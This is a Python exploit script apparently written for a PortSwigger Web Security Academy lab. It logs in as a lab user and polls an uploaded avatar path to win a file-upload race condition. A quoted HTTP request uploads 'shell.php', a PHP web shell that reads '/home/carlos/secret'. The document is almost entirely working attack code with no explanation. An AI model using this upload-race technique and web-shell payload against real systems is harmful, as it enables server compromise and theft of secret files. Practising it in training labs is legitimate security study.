import requests
import threading

DOMAIN = "0a140083045a432d819b0c4a003400c1.web-security-academy.net"

HEADERS = {
    "Host": DOMAIN,
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": f"https://{DOMAIN}",
    "Connection": "keep-alive",
    "Referer": f"https://{DOMAIN}/login",
    "Cookie": "session=4nzsgZFsvF9DDteG2Vygp192eg2BB7UR",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "TE": "trailers"
}

def  get_csrf_token_login():
    response = requests.get(f"https://{DOMAIN}/login", headers=HEADERS)
    csrf = response.text.split('csrf" value="')[1].split('"')[0]
    HEADERS["Cookie"] = response.headers["Set-Cookie"].split(";")[0]
    return csrf

def login():
    csrf = get_csrf_token_login()
    data = {
        "csrf": csrf,
        "username": "wiener",
        "password": "peter"
    }

    response = requests.post(f"https://{DOMAIN}/login", headers=HEADERS, data=data, allow_redirects=False)

    if response.status_code == 302:
        print(f"Login successful as wiener:peter")
        HEADERS["Cookie"] = response.headers["Set-Cookie"].split(";")[0]
        print(f"New cookie: {HEADERS['Cookie']}")

def get_file_content():
    while True:
        url = f"https://{DOMAIN}/files/avatars/shell.php"
        response = requests.get(url)

        if "Not Found" not in response.text:
            print(f"File content: {response.text}")
        
        # print(response.text)

def race_condition():
    threads = []
    for _ in range(20):
        thread = threading.Thread(target=get_file_content)
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

# to successfully get the file content start intuder(sending request that creates payload php file) and start this script
'''
POST /my-account/avatar HTTP/1.1
Host: 0a140083045a432d819b0c4a003400c1.web-security-academy.net
Cookie: session=7Nl1hQoIA2maNYc3AIhQbsRvXaGHwIba
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a140083045a432d819b0c4a003400c1.web-security-academy.net/my-account?id=wiener
Content-Type: multipart/form-data; boundary=---------------------------3227027385399191843909165581
Content-Length: 538
Origin: https://0a140083045a432d819b0c4a003400c1.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

-----------------------------3227027385399191843909165581
Content-Disposition: form-data; name="avatar"; filename="shell.php"
Content-Type: application/octet-stream

<?php echo file_get_contents('/home/carlos/secret'); echo ' §§'; ?>
-----------------------------3227027385399191843909165581
Content-Disposition: form-data; name="user"

wiener
-----------------------------3227027385399191843909165581
Content-Disposition: form-data; name="csrf"

Dffh1ieWY7jyoXCQeAyEVDCH0TOsTVV5
-----------------------------3227027385399191843909165581--
'''


get_file_content() 